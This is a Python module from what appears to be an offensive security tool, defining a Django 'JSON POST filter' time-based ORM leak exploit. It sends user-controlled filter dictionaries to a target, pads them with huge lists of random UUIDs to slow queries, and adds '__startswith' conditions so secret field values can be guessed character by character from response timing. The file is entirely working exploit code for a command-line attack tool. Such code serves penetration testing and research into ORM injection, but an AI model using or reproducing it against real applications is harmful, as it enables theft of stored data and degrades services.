import uuid

from plormber.attacks.time.django.base import DjangoBaseTimeBasedORMLeak
from typing import Optional

class DjangoPostFilterJsonTimeBasedORMLeak(DjangoBaseTimeBasedORMLeak):
    command_name = 'django-post-filter-json'
    command_description = 'Django JSON POST filter ORM leak exploit example'

    def __init__(self, where_filter_name: Optional[str] = None, **kwargs):
        super().__init__(**kwargs)
        self.where_filter_name = where_filter_name


    def send_request(self, payload: dict):
        return self.request('PUT', self.target, json=payload)


    def prepare_payload(self, p: dict) -> dict:
        return {self.where_filter_name: p} if self.where_filter_name else p
    

    def build_dos_payload(self):
        base_dict = {
            f"{self.dump_key}__{self.dos_key}__{dos_field}__in": [
                str(uuid.uuid4())
                for _i in range(self.dos_array_len)
            ]
            for dos_field in self.dos_fields
        }
        return self.prepare_payload(base_dict)
    

    def add_orm_leak_payload(self, payload, test_val):
        if self.where_filter_name:
            payload[self.where_filter_name][f"{self.dump_key}__{self.dump_val}__startswith"] = test_val
        else:
            payload[f"{self.dump_key}__{self.dump_val}__startswith"] = test_val

        return payload


    @classmethod
    def add_options(cls, parser):
        parser = super().add_options(parser)

        parser.add_argument(
            '--where-filter-name',
            help='the name of the param that is inserted as a where on prisma (e.g. query)',
            default=None,
            type=str
        )

        return parser